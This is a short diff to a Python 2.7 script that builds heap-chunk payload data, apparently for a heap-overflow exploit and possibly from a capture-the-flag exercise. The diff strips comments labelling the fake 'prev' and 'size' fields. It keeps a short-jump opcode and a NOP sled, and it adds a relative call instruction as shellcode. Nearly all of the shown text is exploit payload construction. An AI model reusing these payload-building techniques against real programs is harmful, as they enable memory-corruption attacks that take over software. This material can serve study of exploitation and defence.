@@ -1,8 +1,9 @@
 #!/usr/bin/python2.7
 
-    chunk0  =   'AAAA'          #chunk0 prev
-    chunk0  +=  '\xeb\x0e'      #chunk0 size
+    chunk0  =   'AAAA'          
+    chunk0  +=  '\xeb\x0e'      
     chunk0  +=  '\x90' * 14
+    chunk0  +=  '\xe8\x43\xc8\xff\xff'
     chunk0  =   chunk0.ljust(0x20, 'A')
 
     chunk1  =   'AAAA'          #chunk1 prev
